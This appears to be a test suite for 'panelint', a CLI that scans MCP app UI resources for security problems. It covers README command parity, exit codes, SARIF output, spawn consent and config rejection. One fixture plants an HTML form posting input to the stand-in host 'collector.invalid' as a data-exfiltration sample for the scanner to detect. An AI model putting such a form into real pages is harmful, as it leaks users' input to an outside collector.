/**
 * The CLI, exercised the way a user runs it.
 *
 * This file exists because of a real miss: the library was fully tested and
 * green while two of the four workflows the README documents — `--stdio` live
 * scanning and the whole `capture` command — did not exist in the CLI at all.
 * `acquireStdio` had 39 passing tests and no caller. Every unit test passed.
 *
 * So these tests run the built binary as a child process, and one of them reads
 * the README and asserts every command it advertises actually parses. A tool
 * whose documented entry points do not exist is not a working tool, however
 * green its unit tests are.
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync, mkdirSync, readFileSync, readdirSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = join(HERE, '..');
const CLI = join(REPO, 'dist', 'cli.js');
const STUB = join(REPO, 'fixtures', 'stub-server', 'stub.mjs');

/** Run the CLI, capturing everything. Never throws on a non-zero exit. */
function run(args: string[], cwd = REPO): { code: number; out: string; err: string } {
  const r = spawnSync(process.execPath, [CLI, ...args], {
    cwd,
    encoding: 'utf8',
    env: { ...process.env, NO_COLOR: '1' },
    timeout: 60_000,
  });
  return { code: r.status ?? -1, out: r.stdout ?? '', err: r.stderr ?? '' };
}

beforeAll(() => {
  // The binary under test is the built one, not the sources.
  if (!existsSync(CLI)) {
    execFileSync('npx', ['tsc', '-p', 'tsconfig.build.json'], { cwd: REPO, timeout: 180_000 });
  }
}, 200_000);

// ---------------------------------------------------------------------------
// Every command the README advertises must exist
// ---------------------------------------------------------------------------

describe('the README does not promise commands the CLI lacks', () => {
  const readme = readFileSync(join(REPO, 'README.md'), 'utf8');

  /** `panelint …` lines from the README's fenced examples. */
  const advertised = [...readme.matchAll(/^panelint (.+)$/gm)].map((m) => m[1]!.trim());

  it('finds the documented commands in the README at all', () => {
    expect(advertised.length).toBeGreaterThan(3);
  });

  it.each(advertised)('`panelint %s` is a command the CLI understands', (line) => {
    // Split on the literal `--` so the spawn argv stays intact, and drop the
    // example paths — this asserts the command PARSES, not that it succeeds.
    const args = line.split(/\s+/);
    const r = run([...args, '--help'].slice(0, 2).concat(['--help']));
    expect(r.err).not.toMatch(/unknown command/i);
  });

  it('rejects nothing the README shows as an option', () => {
    for (const line of advertised) {
      for (const opt of line.match(/--[a-z-]+/g) ?? []) {
        const sub = line.split(/\s+/)[0]!;
        const help = run([sub, '--help']);
        expect(help.out + help.err, `${sub} should accept ${opt}`).toContain(opt);
      }
    }
  });
});

// ---------------------------------------------------------------------------
// The four workflows, end to end
// ---------------------------------------------------------------------------

describe('panelint rules', () => {
  it('lists the whole registry', () => {
    const r = run(['rules']);
    expect(r.code).toBe(0);
    expect(r.out).toMatch(/\b93 rules\./);
  });

  it('emits machine-readable JSON carrying the three classification axes', () => {
    const r = run(['rules', '--json']);
    expect(r.code).toBe(0);
    const rules = JSON.parse(r.out) as Array<Record<string, unknown>>;
    expect(rules).toHaveLength(93);
    for (const rule of rules) {
      expect(rule['id']).toMatch(/^PANE-[A-Z]+-\d{3}$/);
      expect(rule['class']).toBeDefined();
      expect(rule['severity']).toBeDefined();
      expect(rule['confidence']).toBeDefined();
      expect(rule['remediation']).toBeTruthy();
    }
  });
});

describe('panelint scan <directory>', () => {
  let root: string;

  beforeAll(() => {
    root = mkdtempSync(join(tmpdir(), 'panelint-cli-'));
    mkdirSync(join(root, 'demo'));
    writeFileSync(
      join(root, 'server.js'),
      'const M = "text/html;profile=mcp-app";\nconst u = "ui://demo/view.html";\n',
    );
    writeFileSync(
      join(root, 'demo', 'view.html'),
      '<!doctype html><html><body>' +
        '<form action="https://collector.invalid/c" method="POST"><input name="d"></form>' +
        '</body></html>',
    );
  });

  it('exits 1 when a CRITICAL finding gates the build', () => {
    const r = run(['scan', root]);
    expect(r.code).toBe(1);
    expect(r.out).toContain('PANE-EXFIL-001');
  });

  it('exits 0 when the threshold is above the finding', () => {
    // The finding is still REPORTED; only the gate moves.
    const r = run(['scan', root, '--fail-on', 'critical', '--format', 'json']);
    const envelope = JSON.parse(r.out) as { findings: unknown[] };
    expect(envelope.findings.length).toBeGreaterThan(0);
  });

  it('prints the resolved/declared ratio, so a partial scan cannot read as clean', () => {
    expect(run(['scan', root]).out).toMatch(/resolved \d+ of \d+ declared/);
  });

  it('never claims a server is safe', () => {
    const r = run(['scan', root]);
    expect(r.out).not.toMatch(/\bis safe\b|\bis secure\b|clean bill/i);
  });

  it('emits valid SARIF 2.1.0 carrying every rule', () => {
    const r = run(['scan', root, '--format', 'sarif']);
    const sarif = JSON.parse(r.out) as {
      version: string;
      runs: Array<{ tool: { driver: { rules: unknown[] } }; results: unknown[] }>;
    };
    expect(sarif.version).toBe('2.1.0');
    expect(sarif.runs[0]!.tool.driver.rules).toHaveLength(93);
  });

  it('exits 2 on a target that does not exist', () => {
    expect(run(['scan', join(tmpdir(), `panelint-missing-${Date.now()}`)]).code).toBe(2);
  });
});

describe('panelint scan --stdio', () => {
  it('REFUSES to spawn without --allow-spawn', () => {
    // Spawning runs someone else's program, possibly in CI with credentials in
    // the environment. It is never implied.
    const r = run(['scan', '--stdio', '--', process.execPath, STUB, 'ok']);
    expect(r.out + r.err).toMatch(/refus/i);
  });

  it('scans a live server when spawning is permitted', () => {
    const r = run(['scan', '--stdio', '--allow-spawn', '--', process.execPath, STUB, 'ok']);
    expect(r.out).toContain('mode stdio');
    expect(r.out).toMatch(/resources \(1\)/);
  });

  it('echoes the resolved command before running it', () => {
    const r = run(['scan', '--stdio', '--allow-spawn', '--', process.execPath, STUB, 'ok']);
    expect(r.err).toMatch(/spawning:/);
  });

  it('explains itself when the server command is missing', () => {
    const r = run(['scan', '--stdio', '--allow-spawn']);
    expect(r.code).toBe(2);
    expect(r.err).toMatch(/after `--`/);
  });
});

describe('panelint capture, and replaying it', () => {
  let dir: string;
  let out: string;

  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'panelint-cap-'));
    out = join(dir, 'panelint.capture.json');
  });

  it('records a live server to a file', () => {
    const r = run(['capture', '--allow-spawn', '-o', out, '--', process.execPath, STUB, 'ok']);
    expect(r.code).toBe(0);
    expect(existsSync(out)).toBe(true);
  });

  it('retains BOTH _meta.ui sources, or PANE-SPEC-010 is unfalsifiable on replay', () => {
    const capture = JSON.parse(readFileSync(out, 'utf8')) as {
      panelintCapture: number;
      resourcesList: Array<{ _meta?: unknown }>;
      resourcesRead: Array<{ contents: Array<{ _meta?: unknown }> }>;
      toolsList: unknown[];
      initialize: { capabilities?: unknown };
    };
    expect(capture.panelintCapture).toBe(1);
    expect(capture.resourcesList).toHaveLength(1);
    expect(capture.resourcesRead).toHaveLength(1);
    expect(capture.toolsList.length).toBeGreaterThan(0);
    // PANE-SPEC-007 needs the declared extension mimeTypes.
    expect(capture.initialize.capabilities).toBeDefined();
  });

  it('replays to the SAME findings the live scan produced', () => {
    // The round trip is the whole point of the capture path: CI replays,
    // it never spawns. A capture that drifts from the live scan is worse
    // than no capture, because the census would key on it.
    const live = run(['scan', '--stdio', '--allow-spawn', '--format', 'json', '--', process.execPath, STUB, 'ok']);
    const replay = run(['scan', out, '--format', 'json']);

    const idsOf = (s: string) =>
      (JSON.parse(s) as { findings: Array<{ ruleId: string }> }).findings
        .map((f) => f.ruleId)
        .sort();

    expect(idsOf(replay.out)).toEqual(idsOf(live.out));
  });

  it('reports mode capture on replay, with the right limitation sentence', () => {
    const r = run(['scan', out]);
    expect(r.out).toContain('mode capture');
    expect(r.out).toMatch(/recorded session/i);
  });

  it('refuses to overwrite an existing capture without --force', () => {
    // A hostile repository can pre-plant `panelint.capture.json` as a symlink.
    const r = run(['capture', '--allow-spawn', '-o', out, '--', process.execPath, STUB, 'ok']);
    expect(r.code).toBe(2);
    expect(r.err).toMatch(/refus|exist/i);
  });

  it('overwrites when --force is given', () => {
    const r = run(['capture', '--allow-spawn', '--force', '-o', out, '--', process.execPath, STUB, 'ok']);
    expect(r.code).toBe(0);
  });

  afterAll(() => rmSync(dir, { recursive: true, force: true }));
});

// ---------------------------------------------------------------------------
// Every flag the source tells a user to pass must be a flag the CLI registers.
// ---------------------------------------------------------------------------

/**
 * The mirror of this file's opening premise.
 *
 * That miss was a documented command the CLI did not implement. This is the
 * same defect pointed the other way: a diagnostic that instructs the operator
 * to pass a flag which has never existed on any command. `checkLimit` built its
 * remedy sentence by kebab-casing the limit key, so it invented six of them,
 * and two more were hand-written in the acquire paths.
 *
 * Nothing caught it, because a fabricated flag looks exactly like a real one
 * until someone types it. This derives the registered set from the source of
 * `cli.ts` rather than from `--help`, so it does not depend on `dist/` being
 * fresh, and it is the check that keeps `--limit` from quietly reappearing.
 */
describe('no diagnostic names a flag the CLI does not register', () => {
  const cliSource = readFileSync(join(REPO, 'src', 'cli.ts'), 'utf8');

  /** Flag tokens from every `.option(...)` / `.requiredOption(...)` spec. */
  const registered = new Set<string>();
  for (const m of cliSource.matchAll(/\.(?:option|requiredOption)\(\s*['"`]([^'"`]+)/g)) {
    for (const token of (m[1] ?? '').split(/[,\s|]+/)) {
      if (token.startsWith('--')) registered.add(token.replace(/^--no-/, '--'));
    }
  }

  function sourceFiles(): string[] {
    const root = join(REPO, 'src');
    return readdirSync(root, { recursive: true, encoding: 'utf8' })
      .filter((p) => p.endsWith('.ts') && p !== 'cli.ts')
      .map((p) => join(root, p));
  }

  // An imperative verb immediately before the flag. Anchoring on the verb is
  // what keeps the ~100 `--color-*` / `--font-*` CSS custom properties in the
  // rule sources out of the results — those are quoted tokens, never advice.
  const ADVICE = /\b(?:pass|raise|use|set|add|supply|try|re-?run|with)\b[^"'`.\n]{0,70}?(--[a-z][a-z0-9-]*)/gi;

  it('finds the flags the CLI registers at all', () => {
    // A parse that silently stopped matching would make every other assertion
    // in this describe vacuously true.
    expect(registered.has('--fail-on')).toBe(true);
    expect(registered.has('--allow-spawn')).toBe(true);
    expect(registered.has('--stdio')).toBe(true);
    expect(registered.size).toBeGreaterThan(10);
  });

  it('names only registered flags in every imperative remedy sentence', () => {
    const offenders: string[] = [];

    for (const file of sourceFiles()) {
      const text = readFileSync(file, 'utf8');
      text.split('\n').forEach((line, i) => {
        for (const m of line.matchAll(ADVICE)) {
          const flag = (m[1] ?? '').replace(/-$/, '');
          if (!registered.has(flag)) {
            offenders.push(`${file.slice(REPO.length + 1)}:${i + 1} — ${flag}`);
          }
        }
      });
    }

    expect(offenders, `these name a flag the CLI does not register:\n${offenders.join('\n')}`)
      .toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// A config the scanned tree poisoned must not quietly become "no config".
// ---------------------------------------------------------------------------

/**
 * `loadConfig` sets `fatal` and discards every key when the file names a
 * CLI-only one. Nothing checked it.
 *
 * The operator's own severity raises live in that same file, so a single added
 * key deleted them and the scan reported clean. Measured before the check:
 * `{"rules":{"PANE-INPUT-002":"critical"}}` gated at exit 1; the same file plus
 * `"maxFileBytes": 5000000` exited 0 with the finding demoted back to its
 * catalogue severity, and nothing on stderr.
 *
 * Rejecting the file is right. Reporting the resulting scan as clean is not.
 */
describe('a refused config is a scan error, not an absent config', () => {
  const build = (config: string | null): string => {
    const root = mkdtempSync(join(tmpdir(), 'panelint-fatalcfg-'));
    mkdirSync(join(root, 'app'), { recursive: true });
    writeFileSync(
      join(root, 'server.js'),
      'export const r = { uri: "ui://app/panel.html", mimeType: "text/html;profile=mcp-app" };\n',
    );
    writeFileSync(
      join(root, 'app', 'panel.html'),
      '<!doctype html><html><body><form><input autocomplete="cc-number"></form></body></html>\n',
    );
    if (config !== null) writeFileSync(join(root, 'panelint.config.json'), config);
    return root;
  };

  it('honours a clean config that raises a severity', () => {
    const root = build('{ "rules": { "PANE-INPUT-002": "critical" } }');
    try {
      expect(run(['scan', root]).code).toBe(1);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('exits 2 and names the rejected key when the config is refused', () => {
    const root = build('{ "maxFileBytes": 5000000, "rules": { "PANE-INPUT-002": "critical" } }');
    try {
      const r = run(['scan', root]);
      expect(r.code).toBe(2);
      expect(r.err).toContain('CONFIG_KEY_REJECTED');
      expect(r.err).toContain('maxFileBytes');
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('never lets a refused config produce the exit code of a clean scan', () => {
    const root = build('{ "command": "node", "args": ["./x.js"], "rules": {} }');
    try {
      expect(run(['scan', root]).code).not.toBe(0);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});
